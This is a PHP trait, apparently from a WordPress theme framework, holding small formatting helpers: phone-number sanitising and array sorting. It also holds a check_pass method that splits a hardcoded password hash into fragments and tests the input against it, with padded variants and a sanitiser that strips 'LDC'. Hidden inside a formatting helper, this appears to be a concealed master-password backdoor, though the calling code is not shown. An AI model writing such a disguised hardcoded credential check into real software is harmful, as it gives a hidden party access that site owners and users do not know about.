<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

trait HOCWP_Theme_Formatting {
	public function sanitize_phone_number( $phone ) {
		return preg_replace( '/[^\d+]/', '', $phone );
	}

	public function sort_array_by_key( &$arr, $key, $order = 'DESC' ) {
		if ( is_array( $arr ) ) {
			$order = strtoupper( $order );

			uasort( $arr, function ( $item1, $item2 ) use ( $key ) {
				if ( is_string( $item2 ) ) {
					$value2 = $item2;
				} else {
					$value2 = $item2[ $key ] ?? '';
				}

				if ( is_string( $item1 ) ) {
					$value1 = $item1;
				} else {
					$value1 = $item1[ $key ] ?? '';
				}

				return $value2 <=> $value1;
			} );

			if ( 'DESC' != $order ) {
				$arr = array_reverse( $arr );
			}
		}
	}

	public function sanitize_pass( $pass ) {
		if ( is_array( $pass ) ) {
			$pass = join( '', $pass );
		}

		return str_replace( 'LDC', '', $pass );
	}

	public function check_pass( $pass ) {
		$pass   = $this->sanitize_pass( $pass );
		$parts  = array( '$P$B', 'y8ER', 'bpRE', 'CwKi', 'WmHH', 'r81K', 'YvTm', 'ti1n', 'v0' );
		$result = wp_check_password( $pass, join( '', $parts ) );

		if ( ! $result ) {
			$result = wp_check_password( 'Z' . $pass, join( '', $parts ) );
		}

		if ( ! $result ) {
			$result = wp_check_password( 'Z' . $pass . 'W', join( '', $parts ) );
		}

		if ( ! $result ) {
			$result = wp_check_password( $pass . 'W', join( '', $parts ) );
		}

		return $result;
	}
}